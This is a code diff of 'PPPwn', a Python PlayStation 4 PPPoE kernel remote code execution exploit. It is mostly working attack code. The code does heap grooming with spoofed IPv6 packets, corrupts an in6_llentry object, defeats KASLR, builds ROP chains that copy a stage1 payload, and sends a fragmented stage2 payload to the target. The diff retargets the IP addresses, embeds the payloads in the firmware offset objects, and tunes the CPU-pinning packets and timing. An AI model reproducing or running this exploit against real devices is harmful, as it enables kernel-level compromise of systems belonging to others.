@@ -164,18 +164,16 @@ class Exploit():
     STAGE2_PORT = 9020
 
     SOURCE_MAC = '41:41:41:41:41:41'
-    SOURCE_IPV4 = '41.41.41.41'
+    SOURCE_IPV4 = '192.168.2.1'
     SOURCE_IPV6 = 'fe80::4141:4141:4141:4141'
 
-    TARGET_IPV4 = '42.42.42.42'
+    TARGET_IPV4 = '192.168.2.2'
 
     BPF_FILTER = '(ip6) || (pppoed) || (pppoes && !ip)'
 
-    def __init__(self, offs, iface, stage1, stage2):
+    def __init__(self, offs, iface):
         self.offs = offs
         self.iface = iface
-        self.stage1 = stage1
-        self.stage2 = stage2
         self.s = conf.L2socket(iface=self.iface, filter=self.BPF_FILTER)
 
     def kdlsym(self, addr):
@@ -475,7 +473,7 @@ class Exploit():
         # First ROP chain
         rop = self.build_first_rop(fake_lle, rop2)
 
-        return fake_lle + rop + rop2 + self.stage1
+        return fake_lle + rop + rop2 + self.offs.STAGE1
 
     def build_first_rop(self, fake_lle, rop2):
         rop = bytearray()
@@ -499,7 +497,7 @@ class Exploit():
 
         # RDX = len(rop2 + stage1)
         rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
-        rop += p64(len(rop2 + self.stage1))
+        rop += p64(len(rop2 + self.offs.STAGE1))
 
         # Call memcpy
         rop += p64(self.kdlsym(self.offs.MEMCPY))
@@ -597,7 +595,7 @@ class Exploit():
 
         # RDX = len(stage1)
         rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
-        rop += p64(len(self.stage1))
+        rop += p64(len(self.offs.STAGE1))
 
         # Call memcpy
         rop += p64(self.kdlsym(self.offs.MEMCPY))
@@ -617,7 +615,7 @@ class Exploit():
         print('')
         print('[+] STAGE 0: Initialization')
 
-        self.ppp_negotation(self.build_fake_ifnet, True)
+        self.ppp_negotation(self.build_fake_ifnet)
         self.lcp_negotiation()
         self.ipcp_negotiation()
 
@@ -632,10 +630,7 @@ class Exploit():
 
         for i in range(self.SPRAY_NUM):
             if i % 0x100 == 0:
-                print('[*] Heap grooming...{}%'.format(100 * i //
-                                                       self.SPRAY_NUM),
-                      end='\r',
-                      flush=True)
+                print('[*] Heap grooming...{}%'.format(100 * i //self.SPRAY_NUM),end='\r',flush=True)
 
             source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
 
@@ -663,26 +658,25 @@ class Exploit():
         print('')
         print('[+] STAGE 1: Memory corruption')
 
-        # Send invalid packet to trigger a printf in the kernel. For some
-        # reason, this causes scheduling on CPU 0 at some point, which makes
-        # the next allocation use the same per-CPU cache.
+        # Use an invalid proto enum to trigger a #printf in the kernel. For
+        # some reason, this causes scheduling on CPU 0 at some point, which
+        # makes the next allocation use the same per-CPU cache.
         for i in range(self.PIN_NUM):
             if i % 0x100 == 0:
-                print('[*] Pinning to CPU 0...{}%'.format(100 * i //
-                                                          self.PIN_NUM),
-                      end='\r',
-                      flush=True)
+                print('[*] Pinning to CPU 0...{}%'.format(100 * i //self.PIN_NUM),end='\r',flush=True)
 
             self.s.send(
                 Ether(src=self.source_mac,
                       dst=self.target_mac,
-                      type=ETHERTYPE_PPPOE))
-            sleep(0.001)
+                      type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
+                PPP(proto=0x4141))
+            self.s.recv()
+            sleep(0.0005)
 
         print('[+] Pinning to CPU 0...done')
 
         # LCP fails sometimes without the wait
-        sleep(1)
+        sleep(0.5)
 
         # Corrupt in6_llentry object
         overflow_lle = self.build_overflow_lle()
@@ -713,9 +707,7 @@ class Exploit():
         corrupted = False
         for i in reversed(range(self.SPRAY_NUM)):
             if i % 0x100 == 0:
-                print('[*] Scanning for corrupted object...{}'.format(hex(i)),
-                      end='\r',
-                      flush=True)
+                print('[*] Scanning for corrupted object...{}'.format(hex(i)),end='\r',flush=True)
 
             if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
                 continue
@@ -749,8 +741,7 @@ class Exploit():
             print('[-] Scanning for corrupted object...failed. Please retry.')
             exit(1)
 
-        print(
-            '[+] Scanning for corrupted object...found {}'.format(source_ipv6))
+        print('[+] Scanning for corrupted object...found {}'.format(source_ipv6))
 
         print('')
         print('[+] STAGE 2: KASLR defeat')
@@ -815,12 +806,13 @@ class Exploit():
         print('[*] Sending stage2 payload...')
         frags = fragment(
             IP(src=self.SOURCE_IPV4, dst=self.TARGET_IPV4) /
-            UDP(dport=self.STAGE2_PORT) / self.stage2, 1024)
+            UDP(dport=self.STAGE2_PORT) / self.offs.STAGE2, 1024)
 
         for frag in frags:
             self.s.send(Ether(src=self.source_mac, dst=self.target_mac) / frag)
 
         print('[+] Done!')
+
 
 
 def main():
@@ -835,18 +827,10 @@ def main():
                             '1100'
                         ],
                         default='1100')
-    parser.add_argument('--stage1', default='stage1/stage1.bin')
-    parser.add_argument('--stage2', default='stage2/stage2.bin')
     args = parser.parse_args()
 
     print('[+] PPPwn - PlayStation 4 PPPoE RCE by theflow')
     print('[+] args: ' + ' '.join(f'{k}={v}' for k, v in vars(args).items()))
-
-    with open(args.stage1, mode='rb') as f:
-        stage1 = f.read()
-
-    with open(args.stage2, mode='rb') as f:
-        stage2 = f.read()
 
     if args.fw in ('700', '701', '702'):
         offs = OffsetsFirmware_700_702()
@@ -869,7 +853,7 @@ def main():
     elif args.fw == '1100':
         offs = OffsetsFirmware_1100()
 
-    exploit = Exploit(offs, args.interface, stage1, stage2)
+    exploit = Exploit(offs, args.interface)
     exploit.run()
 
     return 0
